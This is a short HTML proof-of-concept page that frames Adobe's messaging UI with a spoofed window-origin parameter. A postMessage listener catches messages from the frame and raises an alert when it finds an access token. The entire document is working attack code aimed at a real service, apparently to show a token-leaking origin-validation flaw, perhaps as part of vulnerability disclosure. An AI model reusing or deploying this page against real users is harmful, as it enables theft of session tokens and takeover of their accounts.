<!DOCTYPE html>
<html>
<body>
    <h1>Intercepting Adobe Messaging...</h1>
    <iframe id="malicious_iframe" 
        src="https://ui.messaging.adobe.com/3.8.16/index.html?lc=en_us#%7B%22window_origin%22%3A%22https%3A%2F%2Facrobat.adobe.com%22%2C%22iframe_origin%22%3A%22https%3A%2F%2Fui.messaging.adobe.com%2F3.8.16%2Findex.html%22%2C%22popped%22%3Afalse%7D" 
        style="width:500px; height:500px;">
    </iframe>

    <script>
        window.addEventListener("message", (event) => {
            console.log("Origin:", event.origin);
            
            let data = event.data;
            
            // Handle if data is a string (need to parse it)
            if (typeof data === 'string') {
                try { data = JSON.parse(data); } catch(e) { /* not JSON */ }
            }

            // Look for the adbmsgui_INITIAL_DATA message we saw earlier
            if (data && (data.msgType === "adbmsgui_INITIAL_DATA" || data.accessToken)) {
                console.warn("!!! TOKEN INTERCEPTED !!!");
                console.log(data);
                alert("Found Access Token: " + (data.accessToken || data.message.accessToken));
            }
        }, false);
    </script>
</body>
</html>
